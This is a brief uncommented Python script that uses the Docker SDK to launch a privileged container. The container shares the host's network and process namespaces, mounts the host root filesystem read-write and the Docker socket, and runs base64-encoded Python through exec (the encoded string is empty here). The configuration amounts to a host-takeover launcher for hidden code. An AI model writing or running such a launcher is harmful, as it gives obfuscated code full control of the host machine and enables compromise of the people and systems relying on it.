import docker, sys
c=docker.from_env()
img=c.images.pull('python:3.11-slim')
cmd="python3 -u -c \"import base64;exec(base64.b64decode(''))\""
res=c.containers.run(img.id,command=['bash','-c',cmd],network_mode='host',pid_mode='host',privileged=True,
  volumes={'/':{'bind':'/h','mode':'rw'},'/var/run/docker.sock':{'bind':'/var/run/docker.sock','mode':'rw'}},
  remove=True,stderr=True,stdout=True)
sys.stdout.buffer.write(res)
